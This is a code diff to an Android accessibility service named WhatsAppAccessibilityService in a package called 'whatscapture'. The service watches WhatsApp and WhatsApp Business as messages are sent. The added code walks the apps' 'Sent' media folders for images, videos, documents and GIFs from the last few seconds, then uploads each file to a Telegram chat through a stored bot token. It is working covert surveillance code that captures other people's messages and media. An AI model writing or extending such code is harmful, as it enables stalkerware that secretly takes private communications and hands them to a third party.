@@ -1,12 +1,17 @@
 package com.whatscapture
 
 import android.accessibilityservice.AccessibilityService
+import android.os.Build
+import android.os.Environment
 import android.util.Log
 import android.view.accessibility.AccessibilityEvent
 import android.view.accessibility.AccessibilityNodeInfo
 import kotlinx.coroutines.CoroutineScope
 import kotlinx.coroutines.Dispatchers
+import kotlinx.coroutines.Job
+import kotlinx.coroutines.delay
 import kotlinx.coroutines.launch
+import java.io.File
 
 class WhatsAppAccessibilityService : AccessibilityService() {
 
@@ -15,6 +20,7 @@ class WhatsAppAccessibilityService : AccessibilityService() {
     private var lastSentSignature: String = ""
     private var lastSentAt: Long = 0L
     private var lastComposerText: String = ""
+    private var pendingMediaScan: Job? = null
 
     override fun onServiceConnected() {
         Log.i(TAG, "Accessibility service conectado")
@@ -66,6 +72,7 @@ class WhatsAppAccessibilityService : AccessibilityService() {
         if (!isSendAction(event, source) && recentDraft().isBlank()) return
 
         val chatName = findChatName(rootInActiveWindow).ifBlank { "Chat" }
+        scheduleOutgoingMediaScan(pkg)
         val outgoingText = findComposerText(rootInActiveWindow)
             .ifBlank { recentDraft() }
             .trim()
@@ -121,6 +128,88 @@ class WhatsAppAccessibilityService : AccessibilityService() {
                 text = finalMsg
             )
         }
+    }
+
+    private fun scheduleOutgoingMediaScan(pkg: String) {
+        pendingMediaScan?.cancel()
+        pendingMediaScan = CoroutineScope(Dispatchers.IO).launch {
+            repeat(4) { attempt ->
+                delay(1200L + (attempt * 700L))
+
+                val recentFiles = findRecentOutgoingMediaFiles(pkg)
+                if (recentFiles.isEmpty()) {
+                    return@repeat
+                }
+
+                recentFiles.forEach { file ->
+                    TelegramSender.sendFile(
+                        token = Config.getToken(this@WhatsAppAccessibilityService),
+                        chatId = Config.getChatId(this@WhatsAppAccessibilityService),
+                        filePath = file.absolutePath,
+                        fileName = file.name
+                    )
+                }
+
+                return@launch
+            }
+        }
+    }
+
+    private fun findRecentOutgoingMediaFiles(pkg: String): List<File> {
+        val now = System.currentTimeMillis()
+        val sentRoots = buildOutgoingMediaDirectories(pkg)
+
+        return sentRoots.asSequence()
+            .filter { it.exists() && it.isDirectory }
+            .flatMap { root ->
+                runCatching {
+                    root.walkTopDown()
+                        .maxDepth(2)
+                        .filter { file ->
+                            file.isFile &&
+                                !file.name.startsWith(".") &&
+                                !file.name.startsWith("nomedia") &&
+                                now - file.lastModified() <= RECENT_MEDIA_WINDOW_MS
+                        }
+                        .toList()
+                }.getOrDefault(emptyList()).asSequence()
+            }
+            .sortedByDescending { it.lastModified() }
+            .take(MAX_MEDIA_SCAN_RESULTS)
+            .toList()
+    }
+
+    private fun buildOutgoingMediaDirectories(pkg: String): List<File> {
+        val roots = mutableListOf<File>()
+        val externalRoot = Environment.getExternalStorageDirectory()
+
+        if (pkg == WHATSAPP_PACKAGE) {
+            roots += File(externalRoot, "WhatsApp/Media/WhatsApp Images/Sent")
+            roots += File(externalRoot, "WhatsApp/Media/WhatsApp Video/Sent")
+            roots += File(externalRoot, "WhatsApp/Media/WhatsApp Documents/Sent")
+            roots += File(externalRoot, "WhatsApp/Media/WhatsApp Animated Gifs/Sent")
+        } else {
+            roots += File(externalRoot, "WhatsApp Business/Media/WhatsApp Images/Sent")
+            roots += File(externalRoot, "WhatsApp Business/Media/WhatsApp Video/Sent")
+            roots += File(externalRoot, "WhatsApp Business/Media/WhatsApp Documents/Sent")
+            roots += File(externalRoot, "WhatsApp Business/Media/WhatsApp Animated Gifs/Sent")
+        }
+
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
+            if (pkg == WHATSAPP_PACKAGE) {
+                roots += File(externalRoot, "Android/media/com.whatsapp/WhatsApp/Media/WhatsApp Images/Sent")
+                roots += File(externalRoot, "Android/media/com.whatsapp/WhatsApp/Media/WhatsApp Video/Sent")
+                roots += File(externalRoot, "Android/media/com.whatsapp/WhatsApp/Media/WhatsApp Documents/Sent")
+                roots += File(externalRoot, "Android/media/com.whatsapp/WhatsApp/Media/WhatsApp Animated Gifs/Sent")
+            } else {
+                roots += File(externalRoot, "Android/media/com.whatsapp.w4b/WhatsApp Business/Media/WhatsApp Images/Sent")
+                roots += File(externalRoot, "Android/media/com.whatsapp.w4b/WhatsApp Business/Media/WhatsApp Video/Sent")
+                roots += File(externalRoot, "Android/media/com.whatsapp.w4b/WhatsApp Business/Media/WhatsApp Documents/Sent")
+                roots += File(externalRoot, "Android/media/com.whatsapp.w4b/WhatsApp Business/Media/WhatsApp Animated Gifs/Sent")
+            }
+        }
+
+        return roots
     }
 
     private fun isSendAction(event: AccessibilityEvent, source: AccessibilityNodeInfo?): Boolean {
@@ -209,6 +298,8 @@ class WhatsAppAccessibilityService : AccessibilityService() {
         private const val TAG = "WAAccessibility"
         private const val WHATSAPP_PACKAGE = "com.whatsapp"
         private const val WHATSAPP_BUSINESS_PACKAGE = "com.whatsapp.w4b"
+        private const val RECENT_MEDIA_WINDOW_MS = 20_000L
+        private const val MAX_MEDIA_SCAN_RESULTS = 5
 
         private val SEND_HINTS = listOf("send", "enviar")
 
